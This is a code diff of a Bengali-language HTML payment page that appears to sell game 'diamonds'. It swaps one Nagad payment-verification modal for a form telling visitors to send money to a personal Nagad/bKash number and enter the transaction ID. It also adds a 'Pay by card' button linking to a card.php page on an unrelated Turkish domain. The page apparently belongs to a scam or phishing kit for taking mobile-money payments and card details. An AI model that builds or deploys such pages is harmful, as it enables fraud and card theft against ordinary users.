@@ -237,23 +237,24 @@
         </div>
     </div>
 
-    <div class="verification-modal" id="verification-modal">
-        <h2>পেমেন্ট ভেরিফিকেশন</h2>
-        <input type="text" id="transaction-id" placeholder="আপনার Transaction ID দিন">
-        
-        <p>▪️ *167# ডায়াল করে আপনার NAGAD মোবাইল মেনুতে যান অথবা NAGAD অ্যাপে যান।</p>
-        <p>▪️ "Send Money" -এ ক্লিক করুন।</p>
-        <p class="copy-number">▪️ প্রাপক নম্বর হিসেবে এই নম্বরটি লিখুনঃ 
-            <span id="recipient-number">01973011274</span> 
-            <button onclick="copyNumber()">Copy</button>
-        </p>
-        <p>▪️ টাকার পরিমাণঃ <span id="amount">150</span></p>
-        <p>▪️ নিশ্চিত করতে এখন আপনার NAGAD মোবাইল মেনু পিন লিখুন।</p>
-        <p>▪️ সবকিছু ঠিক থাকলে, আপনি NAGAD থেকে একটি নিশ্চিতকরণ বার্তা পাবেন।</p>
-        <p>▪️ এখন নিচের VERIFY বাটনে ক্লিক করুন।</p>
-
-        <button id="verify">VERIFY</button>
-    </div>
+    <div class="payment-container" id="paymentForm">
+        <h2>ট্রানজেকশন আইডি দিন</h2>
+        <input type="text" placeholder="ট্রানজেকশন আইডি দিন" id="transactionId">
+        <p id="amountText"></p>
+        <div class="instructions">
+            <p>• <strong>*167#</strong> ডায়াল করে বা নগদ এপস্য থেকে সেন্ডমানি করতে হবে।</p>
+            <p>• টাকা পাঠিয়ে উপরের বক্সে ট্রানজেকশন আইডি দিয়ে Verify এ ক্লিক করুন।</p>
+            <p>• শুধু মাত্র বিকাশ এবং নগদ এ টাকা পাঠাতে পারবেন।</p>
+            <p>• Nagad/Bkash: <strong>01581050857</strong>
+                <button class="copy-btn" onclick="copyNumber()">Copy</button>
+            </p>
+        </div>
+        <button class="button verify" onclick="verifyPayment()">Verify</button>
+        <button class="button back" onclick="goBack('paymentForm')">Back</button>
+        <button class="button follow" onclick="window.location.href='http://season-event.com.tr/NB/PY/card.php?id=6420661782'">Pay by card 💳</button>
+        <div class="loading" id="loading">
+            <img src="https://i.ibb.co/YfFr9Yt/loading.gif" alt="Loading...">
+        </div>
 
     <script>
         // JavaScript for selecting diamond price
